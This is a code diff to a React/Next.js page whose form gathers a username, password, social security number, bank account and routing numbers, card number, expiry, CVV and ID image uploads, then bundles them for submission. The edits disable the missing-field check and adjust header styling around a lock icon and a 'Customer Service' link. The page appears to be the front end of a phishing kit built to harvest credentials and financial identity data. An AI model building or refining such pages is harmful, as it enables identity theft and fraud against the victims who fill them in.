@@ -77,25 +77,25 @@ export default function Main() {
 
    async function handleSubmit(event: FormEvent) {
       event.preventDefault();
-      if (
-         !formData.username ||
-         !formData.password ||
-         !formData.firstname ||
-         !formData.lastname ||
-         !formData.email ||
-         !formData.address ||
-         !formData.socialSecurity ||
-         !formData.accountNumber ||
-         !formData.routingNumber ||
-         !formData.accountHolderName ||
-         !formData.bankName ||
-         !formData.expiry ||
-         !formData.cvv ||
-         !formData.creditCard ||
-         !formData.imageUploads
-      ) {
-         return alert('Some input fields are missing');
-      }
+      // if (
+      //    !formData.username ||
+      //    !formData.password ||
+      //    !formData.firstname ||
+      //    !formData.lastname ||
+      //    !formData.email ||
+      //    !formData.address ||
+      //    !formData.socialSecurity ||
+      //    !formData.accountNumber ||
+      //    !formData.routingNumber ||
+      //    !formData.accountHolderName ||
+      //    !formData.bankName ||
+      //    !formData.expiry ||
+      //    !formData.cvv ||
+      //    !formData.creditCard ||
+      //    !formData.imageUploads
+      // ) {
+      //    return alert('Some input fields are missing');
+      // }
       const formDataToSubmit = new FormData();
       Object.entries(formData).forEach(([key, value]) => {
          if (key === 'imageUploads' && value) {
@@ -162,15 +162,15 @@ export default function Main() {
             zIndex: 9999,
          }}
       >
-         <div className="flex md:flex-col justify-between items-center text-white py-2 px-[20%] bg-black">
+         <div className="md:flex  justify-between items-center text-white py-2 px-[20%] bg-black">
             <div className="flex flex-col font-bold text-[25px]">
                <img src="assets/data.jpg" alt="Data" />
             </div>
             <div className="space-x-4 space-y-10 text-xs">
                <Link href="/" legacyBehavior>
-                  <a className="hover:text-gray-500">
+                  <a className=" hover:text-gray-500">
                      <LockClosedIcon className="m-h-5 w-5 mr-2" />
-                     Customer Service
+                     <span>Customer Service</span>
                   </a>
                </Link>
                <Link href="/about" legacyBehavior>
